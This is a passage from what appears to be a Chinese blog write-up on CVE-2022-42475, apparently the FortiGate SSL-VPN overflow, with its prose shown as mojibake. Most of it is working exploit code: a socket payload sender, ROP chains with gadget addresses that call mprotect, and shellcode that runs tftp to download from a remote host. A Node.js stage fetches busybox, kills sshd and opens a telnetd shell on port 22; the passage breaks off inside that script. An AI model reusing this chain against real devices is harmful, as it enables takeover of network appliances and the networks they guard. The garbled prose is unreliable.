int_to_bytes(gadget1)        #raw += int_to_bytes(gadget2)        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.109.111&quot;, 4443))        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)        sleep(1)        _socket.sendall(b&#39;ls&#39;)        res = _socket.recv(1024)        print(res)                  #res = _socket.recv(1024)        #if b&quot;HTTP/1.1&quot; not in res:        #    print(&quot;Error detected&quot;)        #    print(CL)        #    continue    except Exception as e:        pass    id+=1</code></pre><p>ä¸Šè¿° exp ä¸èƒ½å† real ç¯å¢ƒä¸‹è¾¾åˆ°æ•ˆæœï¼Œä¸»è¦åŸå› æ˜¯è°ƒç”¨ system é»˜è®¤ä¼šè°ƒç”¨/bin/sh -c cmd æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½† real ç¯å¢ƒé‡Œ sysctl ä¸­æ²¡æœ‰ sh åŠŸèƒ½ï¼Œå¯¼è‡´é€šè¿‡ system å‡½æ•°æ— æ³•æˆåŠŸå‘½ä»¤ã€‚</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnuJGJelUGJlpXZvo7JXJ2Pb.png"></p><p>æµ‹è¯•ä»£ç </p><pre><code>#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123;        system(argv[1],0,0);        return 0;&#125;</code></pre><h2 id="REAL-EXP"><a href="#REAL-EXP" class="headerlink" title="REAL EXP"></a>REAL EXP</h2><p>ç”±äºåœ¨ real environment ä¸­ sh æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç®€å•ä½¿ç”¨ system æ‰§è¡Œï¼Œä»è€Œæˆ‘ä»¬å°†ç›®å…‰è½¬å‘ exec*å®¶æ—</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn8EyhtCuWy7ahtW3yie6ggc.png"></p><p>å¯ä»¥çœ‹åˆ° init æ–‡ä»¶ä¸­ï¼Œexec å®¶æ—å‡½æ•°è¿˜æ˜¯å¾ˆå…¨çš„ï¼ï¼</p><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>è¿™é‡Œä¼šé‡åˆ°ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œè¦å¹²ä»€ä¹ˆå‘¢ï¼Ÿæ‰§è¡Œ/bin/sh æ˜¯æ— ç”¨çš„ é‚£æˆ‘ä»¬è¿˜æ€ä¹ˆèƒ½æ‹¿åˆ° shell å‘¢ï¼Ÿ</p><p>è¿™é‡Œæˆ‘çš„æƒ³æ³•æ˜¯ ç»™ä»–æƒ³åŠæ³•å¼„ä¸€ä¸ª busybox ï¼Ÿå¯ä»¥è€ƒè™‘æ–¹å¼ 1. åˆ†æ/bin/ä¸­æœ‰ä»€ä¹ˆå¯ä»¥ä¼ è¾“æ–‡ä»¶çš„ç¨‹åº 2.rop å†™ä¸€ä¸ªæ–‡ä»¶å†™å…¥çš„ gadgetï¼Œå¹¶ä¸”ä¼ è¾“è¿‡å»æ–‡ä»¶</p><p>æœ€ç»ˆæˆ‘é‡‡ç”¨æ–¹å¼ 1 ï¼ŒåŸå› æ˜¯æ–¹å¼ 2 ä¼ è¾“æ–‡ä»¶å¯èƒ½ä¼šè®©è¾“å…¥è¿‡é•¿ å¯¼è‡´ socket æ–­å¼€ ç­‰ä¸€ç³»åˆ—ç½‘ç»œé—®é¢˜</p><h3 id="æ„é€ æ‰§è¡Œ-rop"><a href="#æ„é€ æ‰§è¡Œ-rop" class="headerlink" title="æ„é€ æ‰§è¡Œ rop"></a>æ„é€ æ‰§è¡Œ rop</h3><p>è¿™é‡Œéœ€è¦çŸ¥é“ exec*å®¶æ—æœ‰ä¸¤å¤§æ´¾ç³»ï¼Œä¸€ç§æ˜¯å‚æ•°ä¼ å‚ï¼Œå¦ä¸€ç§æ˜¯æ•°ç»„ä¼ å‚</p><pre><code>#include &lt;unistd.h&gt;int execl(const char *path, const char *arg, ...);int execlp(const char *file, const char *arg, ...);int execle(const char *path, const char *arg, ..., char *const envp[]);int execv(const char *path, char *const argv[]);int execvp(const char *file, char *const argv[]);int execve(const char *path, char *const argv[], char *const envp[]);</code></pre><p>é€šè¿‡ç¼–å†™äº†ä¸ª demo ç¨‹åºç†Ÿæ‚‰ä¸€ä¸‹è°ƒç”¨æ–¹å¼,è¿™é‡Œç”¨çš„æ˜¯å‚æ•°ä¼ å‚ï¼ŒåŸå› æ˜¯æˆ‘æƒ³ç›´æ¥ rop åˆ°å¯„å­˜å™¨ç„¶åæ‰§è¡Œ</p><pre><code>#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;gcc -g test.c -static -o testvoid main()&#123;      execl(&quot;/bin/tftp&quot;,&quot;/bin/tftp&quot;, &quot;192.168.109.128&quot;, &quot;busybox&quot;, &quot;get&quot;, &quot;octet&quot;, &quot;/sbin/busybox&quot;, NULL);&#125;</code></pre><p>æŸ¥çœ‹ ida</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnP0m4tw82EOVuFkUWH8bFWv.png"></p><p>é€šè¿‡ ida ä¹Ÿå¯ä»¥å†ç†Ÿæ‚‰ä¸€ä¸‹ x64 çš„è°ƒç”¨é¡ºåº</p><pre><code>rdi rsi rdx rcx r8 r9 stack stack+8 .....</code></pre><p>é‚£æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ª rop chainï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹ gadget</p><pre><code>è·å–rspåœ°å€ å¹¶ä¸”èƒ½è®¡ç®—rspåç§»ä¾‹å¦‚ mov reg, rsp;ret, add reg ,offet; ret æˆ–è€… push rps; ret pop reg; ret , add reg, offet; retå°†æ ˆä¸­åœ°å€ä¼ é€’åˆ°å¯„å­˜å™¨ä¸­è‡³å°‘éœ€è¦ pop rdiï¼›pop rsiï¼›pop rdxï¼›pop rcx; pop r8;pop r9call exec* è¿™ä¸ªç¨‹åºä¸­éƒ½æœ‰</code></pre><p>å½“èƒ½æ„é€ å‡ºè¿™äº›å‚æ•°æ—¶ä¼šé‡åˆ°é—®é¢˜ï¼Œæ ˆä¸­å­—ç¬¦ä¸²é—®é¢˜ï¼š</p><p>å½“å­—ç¬¦ä¸² byte&gt;8 æ—¶ï¼Œç›´æ¥æ”¾åœ¨æ ˆä¸­ä¼šå¯¼è‡´å ç©ºé—´é¢å¤–å¤šå‡ºä¸€ä¸ªéƒ¨åˆ†</p><p>ä¾‹å¦‚æˆ‘ rop ä¸­æ”¾å…¥å­—ç¬¦ä¸² <code>192.168.109.128</code> åˆ™æ ˆä¸­ rsp éƒ¨åˆ†ç¡®å®æ˜¯ è¯¥å­—ç¬¦ä¸²ï¼Œä½† rsp+8 çš„ä½ç½®å´å˜æˆäº† 109.128</p><p>è¿™ä¸ªé—®é¢˜ä¼šå¯¼è‡´æˆ‘ä»¬æ„é€ å‚æ•°æ—¶ä¼šå¤šå‡ºä¸å¯æ§çš„å­—ç¬¦ä¸²ã€‚å¯¼è‡´å¦‚æœè€ƒè™‘ char åˆ—è¡¨æ¥è°ƒç”¨çš„è¯ rop chain ä¼šä¿®æ”¹çš„éå¸¸éº»çƒ¦ï¼ï¼ï¼éå¸¸éå¸¸éº»çƒ¦ï¼</p><p>ä»è€Œç›®å…‰è½¬å‘å¯„å­˜å™¨ä¼ å‚çš„æ–¹å¼ï¼Œè¯¥æ–¹å¼ä¹Ÿå­˜åœ¨é—®é¢˜</p><ol><li>å¯„å­˜å™¨ä¼ å‚ rop æ—¶ è¶Šå‘åæ„é€ è¶Šä¼šå‡ºç°æ²¡æœ‰å¥½ç”¨çš„ gadget çš„æƒ…å†µï¼Œå› ä¸ºä½ ä¸èƒ½ç ´åå‰é¢å‡ ä¸ªå‚æ•°</li><li>rop æ—¶å­—ç¬¦ä¸²åœ°å€ä¼šå’Œä¸Šä¸€ç§æ–¹å¼ç›¸åŒ ä¼šå‡ºç°å­—ç¬¦ä¸²åœ°å€è¿ç»­çš„æƒ…å†µï¼Œä½†è¯¥æƒ…å†µå¯ä»¥é€šè¿‡å¤šæ¬¡ rop å°†å­—ç¬¦ä¸²åˆ†å‰²ï¼Œå¹¶ä¸”å¤šæ¬¡è®¡ç®— rsp åœ°å€å¾—åˆ°</li></ol><p>æ­¤æ—¶ æˆ‘çš„æƒ³æ³•æ˜¯ å¦‚ä½•èƒ½å¾—åˆ°éå¸¸å¤Ÿç”¨çš„ gadget å‘¢ï¼Ÿæœ€å¥½çš„æƒ…å†µå°±æ˜¯èƒ½æ‰§è¡Œ shellcode å› ä¸ºè¿™æ ·å°±å¯ä»¥æ»¡è¶³æ¡ä»¶ä¸€ä»¥åŠè½»æ¾çš„æ»¡è¶³æ¡ä»¶äºŒ</p><h3 id="ROP2mprotect"><a href="#ROP2mprotect" class="headerlink" title="ROP2mprotect"></a>ROP2mprotect</h3><p>ç†Ÿæ‚‰çš„ ctf æŠ€å·§ï¼Œæƒ³åŠæ³•å°† rop è½¬åŒ–ä¸º ret2shelllcodeï¼Œå°è¯•åœ¨ init ä¸­æœç´¢ mprotect å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ï¼Œå¹¶ä¸”å­˜åœ¨ä¸¤å¤„è°ƒç”¨ï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ rop æ˜¯ç›´æ¥åˆ°è¿™ä¸¤å¤„åœ°å€çš„ä½ç½®è°ƒç”¨ call _mprotect äº†</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnxeKK9gfPb8ZyH2P6Ic0j6g.png"></p><p>ä½†è¦æ³¨æ„æˆ‘ä»¬è¿˜æ˜¯éœ€è¦ rop æ„é€  mprotect å‚æ•°ï¼Œé¦–å…ˆ ä¸ºäº†åç»­æ›´å¥½çš„ç»§ç»­æ‰§è¡Œ shellcodeï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šå½“å‰è¾“å…¥çš„æ ˆç©ºé—´åœ°å€ï¼Œç”±äºæˆ‘ä»¬æ˜¯ ropï¼Œæœ€å¥½ä¸è¦å‡ºç°å›ºå®šåœ°å€ï¼Œé˜²æ­¢ä¸åŒç¯å¢ƒä¸‹å¯èƒ½æ— æ³•é€šç”¨çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¹ˆé€‰æ‹© leakï¼Œè¦ä¹ˆé€‰æ‹© rop ä¸­é€šè¿‡ push rspï¼Œpop reg çš„æ–¹å¼è·å¾—å½“å‰æ ˆåœ°å€ï¼ŒåŒæ—¶ç†ç”± add regï¼Œoffse çš„æ–¹å¼æ¥æ§åˆ¶åœ°å€å…·ä½“çš„ä½ç½®</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn7mlI5ATg53GoRYbzXuWE3c.png"></p><p>åœ¨æº¢å‡ºç‚¹ä½ç½® æŸ¥çœ‹ proc mapï¼Œè¿™é‡Œé¦–å…ˆè¦è€ƒè™‘çš„èƒ½è¯»å†™çš„ä½ç½®ï¼Œæ¥ç€æœ€å¥½æ˜¯ç°æœ‰å¯æ§çš„ç©ºé—´</p><p>æ­¤æ—¶ï¼Œå¯æ§çš„ç©ºé—´æ˜¯ RDX æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ï¼Œä»–æ‰€å±çš„å†…å­˜æ®µä¸º 0x7f6de0b2a000ï¼Œæˆ‘ä»¬éœ€è¦å°†æ­¤å†…å­˜ç©ºé—´èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œå¹¶ rop ret åˆ°è¯¥åœ°å€ ä»è€Œè¾¾åˆ° ret2shellcode çš„æ­¥éª¤</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnWH7y3iM7wCNrxkK6vb9zmd.png"></p><p>æ‰€ä»¥è¿™æ®µ rop å°±å¯ä»¥æ„é€ äº†</p><pre><code>payload = b&quot;B&quot;*2400        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0xfffffffffffa9688) # offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7               payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect</code></pre><p>ç®€å•è¯´æ˜ä¸€ä¸‹è¿™æ®µ gadget</p><p>pop rax ç”¨æ¥å­˜æ”¾åç§»åœ°å€ï¼Œç”¨æ¥å¾®è°ƒ rsp çš„</p><p>Pop rcx æ˜¯ç”±äºæ ˆç©ºé—´å¤šå‡ºäº†ä¸ª 1ï¼Œæ— ç”¨æ•°æ®éœ€è¦å‡ºæ ˆ</p><p>æ¥ç€æ˜¯ offsetï¼Œç”¨äºè®¡ç®— proc map base address çš„ï¼Œå°±æ˜¯å½“å‰æ ˆçš„ rsp ä¸å½“å‰å†…å­˜æ®µå…¶å®åœ°å€çš„åç§»ï¼Œç”±äºä¸‹é¢ç”¨åˆ°çš„ add gadget æ‰€ä»¥è¿™é‡Œè¦ç”¨è´Ÿæ•°</p><p>Junk op ä¸åšå®é™…æ“ä½œ</p><p>Add rdxï¼Œ rax è®¡ç®— rsp çš„åç§» å‡†å¤‡ç»™ä»–æ‰§è¡Œæƒé™</p><p>Pop rdi ä½œä¸º mprotect çš„ç¬¬ä¸€ä¸ªå‚æ•° ï¼šåœ°å€</p><p>Pop rsi ä½œä¸º mprotect çš„ç¬¬äºŒä¸ªå‚æ•°ï¼š èµ‹äºˆå¤šå¤§çš„ç©ºé—´ len</p><p>Pop rdx ä½œä¸º mprotect çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šèµ‹äºˆçš„æƒé™ 7 = r w x</p><p>æ¥ç€ è°ƒç”¨ç°æœ‰çš„ gadgetï¼Œjmp mprotect æ‰§è¡Œèµ‹äºˆæƒé™</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnUtUuYJTvlmM2MIJTS3qsbd.png"></p><p>rop åæŸ¥çœ‹å½“å‰å†…å­˜ï¼Œå‘ç°å¤šå‡ºäº†ä¸€æ®µå¯æ‰§è¡Œå†…å­˜ã€‚</p><h3 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h3><p>æˆ‘ä»¬æˆåŠŸå¾—åˆ°äº†å¯æ‰§è¡Œçš„å†…å­˜ç©ºé—´ï¼Œé‚£æ¥ä¸‹æ¥ åªéœ€è¦ ret åˆ°è¿™é‡Œå°±å¯ä»¥äº†ï¼Œå…·ä½“ ret åˆ°å“ªé‡Œéœ€è¦æˆ‘ä»¬é€šè¿‡å‘åå¡«å…… shellcodeï¼Œå¹¶åœ¨è°ƒè¯•æ—¶è®¡ç®—å‡º offset ä¹‹åå†è·³è½¬è¿‡å»ï¼Œè€Œä¸æ˜¯ç›´æ¥è·³è½¬ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ‰§è¡Œå®Œåè¿˜éœ€è¦å†æ„é€ ä¸€æ®µè®¡ç®— offset çš„ rop chain</p><pre><code>payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; retpayload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stackpayload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; retpayload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret</code></pre><p>åŒæ ·åˆ©ç”¨ rax å­˜ offset å¾®è°ƒ rsp</p><p>rdi æ˜¯ å½“æ—¶è®¡ç®—åçš„ base mem åœ°å€</p><p>æœ€åæŠŠè®¡ç®—å‡ºçš„ shellcode åœ°å€ å‹æ ˆ ret</p><p>å‚è€ƒä¸‹å›¾ ï¼Œrax å­˜çš„æ˜¯ shellcode çš„åœ°å€ï¼Œå¹¶ä¸”å·²ç»å°†è¯¥åœ°å€å‹æ ˆæ‰§è¡Œ</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnWbt9iKgRGWnks9SXk4ziyh.png"></p><h3 id="Shellcode-æ„é€ "><a href="#Shellcode-æ„é€ " class="headerlink" title="Shellcode æ„é€ "></a>Shellcode æ„é€ </h3><p>æ­¤æ—¶æˆ‘ä»¬è§£å†³çš„ gadget ä¸è¶³çš„é—®é¢˜ï¼Œå¯ä»¥éšå¿ƒæ‰€æ¬²çš„ç¼–å†™è°ƒç”¨äº†ï¼Œä¸ºäº†æ›´å¥½çš„æ§åˆ¶å‚æ•°ï¼Œæˆ‘ä»¬é€‰ç”¨ å¯„å­˜å™¨çš„æ–¹å¼ä¼ å‚ï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„ æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ shellcode ä¸­è°ƒç”¨ exec <em>å®¶æ—ï¼Œå½“ç„¶ä½ å¯ä»¥ syscallï¼Œä½†æ˜¯è¿™é‡Œæˆ‘é€‰æ‹© ret2shellcode ä¸­åªè´Ÿè´£æ„é€ å‚æ•°éƒ¨åˆ†ï¼Œå…·ä½“æ‰§è¡Œ exec</em> çš„äº‹æƒ…äº¤ç»™æ¥ä¸‹æ¥çš„å·¥ä½œã€‚</p><pre><code>from pwn import *context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, os=&#39;linux&#39;)def bytes2stack_bytes(bytes):    stack_str = &quot;0x&quot;    swap_data = bytearray(bytes)    swap_data.reverse()    for i in swap_data:        t = hex(i)[2:]        stack_str+=t        return stack_strdef gen_shellcode_download_file():    save_path = bytes2stack_bytes(b&quot;/sbin/bu&quot;)    arg2 = bytes2stack_bytes(b&quot;octet&quot;)    arg1 = bytes2stack_bytes(b&quot;get&quot;)    filename = bytes2stack_bytes(b&quot;1.js&quot;)    ip_addr2 = bytes2stack_bytes(b&quot;109.128&quot;)    ip_addr1 = bytes2stack_bytes(b&quot;192.168.&quot;)        cmd_path2 = bytes2stack_bytes(b&quot;p&quot;)    cmd_path1 = bytes2stack_bytes(b&quot;/bin/tft&quot;)    shellcode = asm(&#39;&#39;&#39;      sub rsp,0x1000      push 0      mov rbx, &#123;&#125;      push rbx      mov r9, rsp      mov rbx, &#123;&#125;      push rbx      mov r8, rsp      mov rbx, &#123;&#125;      push rbx      mov rcx,rsp      mov rbx, &#123;&#125;      push rbx      mov rbx, &#123;&#125;      push rbx      mov rdx,rsp      mov rbx,&#123;&#125;      push rbx      mov rbx,&#123;&#125;      push rbx      mov rsi,rsp      mov rdi,rsp      push 0      mov rbx,&#123;&#125;      push rbx      mov r10, rsp      add rax, 0x90      mov rsp, rax      push r10      sub rsp, 0x8      nop      ret&#39;&#39;&#39;.format(arg2,arg1,filename,ip_addr2,ip_addr1,cmd_path2,cmd_path1,save_path))    print(shellcode)    print(len(shellcode))def gen_shellcode_execl():    # execl(&quot;/bin/node&quot;,&quot;/bin/node&quot;,&quot;/sbin/bu&quot;)    js_path = bytes2stack_bytes(b&quot;/sbin/bu&quot;)    bin_path2 = bytes2stack_bytes(b&quot;e&quot;)    bin_path1 = bytes2stack_bytes(b&quot;/bin/nod&quot;)    shellcode = asm(&#39;&#39;&#39;      sub rsp,0x1000      mov rcx, 0      mov rbx, &#123;&#125;      push rbx      mov rdx,rsp      mov rbx,&#123;&#125;      push rbx      mov rbx,&#123;&#125;      push rbx      mov rsi,rsp      mov rdi,rsp      add rax, 0x40      mov rsp, rax      nop      nop      nop      ret&#39;&#39;&#39;.format(js_path, bin_path2, bin_path1))    print(shellcode)    print(len(shellcode))gen_shellcode_execl()</code></pre><p>ç®€å•è¯´æ˜ä¸€ä¸‹ä¸¤æ®µ shellcodeï¼Œéƒ½æ˜¯åœ¨å°†å­—ç¬¦ä¸²å‹æ ˆï¼Œç„¶åè®¡ç®—å½“å‰çš„ rsp åœ°å€ï¼Œå¹¶ä¸”ä¿å­˜åœ°å€åˆ°æ ˆçš„å…¶ä»–ä½ç½®ã€‚ç”±äºæ ˆç©ºé—´çš„æœºåˆ¶ï¼Œæˆ‘ä»¬å­—ç¬¦ä¸²å‹æ ˆæœ€å¤§é•¿åº¦æ˜¯ 8ï¼Œæ‰€ä»¥å½“å¤„ç†å¤§äº 8 çš„å­—ç¬¦ä¸²æ—¶æˆ‘ä»¬éœ€è¦åˆ†å‰²ä¸€ä¸‹å¹¶ä¸”ä»åå‘å‰å‹æ ˆ</p><p>æ³¨æ„æˆ‘çš„ shellcode å¼€å¤´ï¼Œå°†æ ˆåˆåšäº†ä¸ªè¿ç§»ï¼Œè¿™ä¸ªåŸå› æ˜¯æ­¤æ—¶ ret2shellcode çš„åœ°å€ä¸æ ˆåœ°å€é‡å  å¦‚æœä¸è¿™ä¹ˆåšï¼Œä¼šå¯¼è‡´ä½ å‹æ ˆçš„æ•°æ®ç ´åæ‰äº†åŸæœ‰çš„ shellcodeï¼Œå¯¼è‡´æ— æ³•ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å†å¼€è¾Ÿä¸€æ®µæ–°çš„å ç©ºé—´ï¼Œè¿™é‡Œé€‰æ‹©è¿˜æ˜¯ ssl ç»“æ„ä½“ä¸­çš„ä½ç½®ï¼Œå› ä¸ºæ­¤æ—¶æ•°æ®å‡ä¸º 00000ã€‚</p><p>ä¹‹åå°±æ­£å¸¸æ„é€ å‚æ•°ï¼Œå¹¶è¦ç¡®å®šå‚æ•°ä½ç½®å‡æ­£ç¡®ï¼Œä½†ä¸è¦å¿˜è®°ï¼ï¼ï¼æˆ‘ä»¬ shellcode æœ€ç»ˆä½ç½®éœ€è¦æ‰§è¡Œ retï¼Œä½†æ˜¯ ret å»å“ªé‡Œå‘¢ï¼Ÿæˆ‘ä»¬è¿˜éœ€è¦è®¡ç®—ä¸€ä¸‹æ¥ä¸‹æ¥çš„ rop æ‰€å­˜å†…å­˜åœ°å€ä¸å½“å‰å¯æ§åœ°å€çš„åç§»ï¼Œå¹¶ä¸”è¿™æ®µè®¡ç®—éœ€è¦æå‰æ”¾åœ¨ shellcode ä¸­ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸ªå‘ç‚¹!!!!</p><p>å°±æ˜¯æœ€ä¸Šè¿°ä¸­è¯´çš„ï¼Œå¯„å­˜å™¨å‚æ•°å¹¶ä¸å¤Ÿï¼Œè¿˜æœ‰ä¸¤ä¸ªå‚æ•°éœ€è¦åœ¨æ ˆä¸­ï¼Œæ³¨æ„æ˜¯è¿™æŒ‡å‘è¿™ä¸¤ä¸ªå‚æ•°çš„åœ°å€åœ¨æ ˆä¸­ï¼Œï¼ï¼ï¼ä¸æ˜¯å­—ç¬¦ä¸²ï¼ï¼ï¼ å…¶ä»–å¯„å­˜å™¨å‚æ•°ä¹ŸåŒæ ·æ˜¯å‚æ•°çš„åœ°å€ è€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼ï¼ï¼ï¼</p><p>ä»¥åŠè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²åœ°å€å¹¶ä¸æ˜¯å‹åœ¨ shellcode æ‰€åœ¨çš„æ ˆä¸­ï¼Œè€Œæ˜¯éœ€è¦åœ¨è®¡ç®—å‡º rop å¤„åœ°å€åçš„ä¸‹ä¸€ä¸ªåœ°å€ï¼ŒåŸå› åœ¨ ret åæ ˆç©ºé—´ä¼šè·‘åˆ° rop æ‰€å¤„åœ°å€ï¼Œæ­¤æ—¶æ ˆçš„ rsp æ˜¯ rop gadget+8 çš„ä½ç½®ï¼Œé‚£åœ¨ shellcode ä¸­åˆ™éœ€è¦å…ˆè®¡ç®—å‡º gadget+8 çš„åœ°å€å¹¶ä¸”å‹å…¥æ ˆä¸­ååœ¨ ret è¿‡å»</p><p>push å‰ï¼š</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnUEY5SpeGZqD7ZGtx0SaRcg.png"></p><p>push åï¼Œå¯ä»¥çœ‹åˆ° push æ˜¯å°†å­—ç¬¦ä¸²å‹æ ˆè¿›äº† c8 çš„ä½ç½®ï¼Œè€Œä¸æ˜¯ d0ï¼Œè¿™é‡Œæ˜¯éœ€è¦æ³¨æ„çš„</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn22rswcryeUmWF8bVCknsod.png"></p><p>ret å‰çš„å †æ ˆ + å¯„å­˜å™¨ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ»¡è¶³è°ƒç”¨å¸ƒå±€</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcndCjP87RZaZKYX77x4nGJ6g.png"></p><p>æœ€ç»ˆæˆåŠŸä¸‹è½½åˆ°æ–‡ä»¶ï¼ˆå·¦ä¾§æ˜¯æœ€ç»ˆæ‰§è¡Œ execv å‰çš„æ ˆç©ºé—´ä¿¡æ¯ï¼Œå³ä¾§æ˜¯æˆåŠŸä¸‹è½½æ–‡ä»¶çš„å®ä¾‹ï¼‰</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnvSYnaWmZLkzG8nK9Bba6Ug.png"></p><p>æ¥ç€é€šè¿‡ node æ–‡ä»¶å»æ„é€ æ–‡ä»¶ä¸‹è½½åŠåç»­ getshell çš„æ–¹æ³•</p><h3 id="Nodejs-shellcode"><a href="#Nodejs-shellcode" class="headerlink" title="Nodejs shellcode"></a>Nodejs shellcode</h3><p>å½“ä¸‹è½½ä¸‹æ¥å‘ç°ï¼ŒåŸæ¥é€šè¿‡ tftp ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶ åªæœ‰è¯»å†™æƒé™ï¼ï¼å¹¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼ï¼ï¼é‚£æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥ busybox æˆ–è€…å…¶ä»– backdoor ç¨‹åºï¼Œå› ä¸ºä¸èƒ½æ‰§è¡Œã€‚</p><p>å½“ç„¶æ­¤å¤„çš„æ ‡é¢˜å°±æ˜¯è§£å†³æ–¹æ³•äº†ï¼Œåœ¨æœç´¢æ—¶å‘ç°é£å¡”å±…ç„¶å†…ç½®äº†ä¸ª nodejsï¼é€šè¿‡æµ‹è¯•å‘ç° nodejs xx.js æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¹¶ä¸” nodejs ä¹Ÿå­˜åœ¨ä¿®æ”¹æ–‡ä»¶æƒé™çš„å‡½æ•°ï¼Œé‚£æ­¤æ—¶æ€è·¯å°±æ›´æ¸…æ™°äº†</p><ol><li>é€šè¿‡ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œä¸‹è½½ shell.js</li><li>shell.js ä¸­è‡³å°‘è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½</li><li>ä¸€ï¼šä¸‹è½½ busybox ï¼ˆæ¯”ä¹‹å‰çš„æ“ä½œç®€å•å¤šäº†ï¼ï¼‰</li><li>äºŒï¼šç»™ busybox æ‰§è¡Œæƒé™</li><li>ä¸‰ï¼šå¼„ä¸€ä¸ª busybox çš„ shell è½¯é“¾</li><li>å››ï¼šè°ƒç”¨ busybox ä¸­å†…ç½®çš„å‘½ä»¤ èµ· shell</li></ol><p>æœ€ç»ˆæˆåŠŸæ„é€ å‡ºä»¥ä¸‹ shellcode</p><pre><code>var fs = require(&#39;fs&#39;);const https = require(&#39;https&#39;)const &#123; execFile, execFileSync &#125; = require(&#39;child_process&#39;);function exp() &#123;         const file2 = &#39;/bin/ash&#39;;        fs.access(file2, fs.constants.F_OK, (err) =&gt; &#123;          if (err) &#123;                  try&#123;                    const res = fs.symlinkSync(&#39;/sbin/busybox&#39;,&#39;/bin/ash&#39;);                    console.log(&#39;ash create success&#39;);                                    &#125;catch(ex)&#123;                    console.log(&#39;ash create error&#39; + ex);                &#125;          &#125;else &#123;                  console.log(&#39;ash already created&#39;);          &#125;        &#125;);        const stdout1 = execFileSync(&#39;/bin/killall&#39;, [&#39;sshd&#39;]);        const stdout2 = execFileSync(&#39;/sbin/busybox&#39;, [&#39;telnetd&#39;, &#39;-l&#39;, &#39;/bin/ash&#39;, &#39;-b&#39;, &#39;0.0.0.0&#39;, &#39;-p&#39;,&#39;22&#39;]);        console.log(stdout1);        console.log(stdout2);        console.log(&#39;shell process create success&#39;);&#125;const file1 = &#39;/sbin/busybox&#39;;fs.access(file1, fs.constants.F_OK, (err) =&gt; &#123;  if (err) &#123;          try&#123;            execFile(&#39;/bin/tftp&#39;, [&#39;192.168.109.128&#39;,&#39;busybox&#39;,&#39;get&#39;, &#39;octet&#39;, &#39;/sbin/busybox&#39;], (err, stdout, stderr) =&gt; &#123;            if(err) &#123;                console.log(err);                return;            &#125;            console.log(&#39;download success&#39;);            fs.chmodSync(&#39;/sbin/busybox&#39;, 777);            console.log(&#39;chmod success&#39;);            exp();        